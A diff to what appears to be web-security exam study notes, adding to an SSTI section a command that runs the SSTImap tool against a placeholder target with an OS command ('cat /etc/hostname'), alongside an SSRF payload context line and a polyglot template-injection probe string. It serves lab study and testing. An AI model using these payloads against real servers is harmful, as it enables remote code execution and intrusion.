@@ -1237,8 +1237,15 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 ## SSTI - Server Side Template Injection
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  
+>SSTI can be ***identified*** using the tool [SSTImap](https://github.com/vladko312/SSTImap) .  
 
->SSTI payloads to ***identify*** vulnerability.  
+```bash
+python /opt/SSTImap/sstimap.py -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /etc/hostname"
+```  
+
+![SSTImap Tool](images/sstimap.png)  
+
+>SSTI payloads to manually ***identify*** vulnerability.  
 
 ```
 ${{<%[%'"}}%\.,
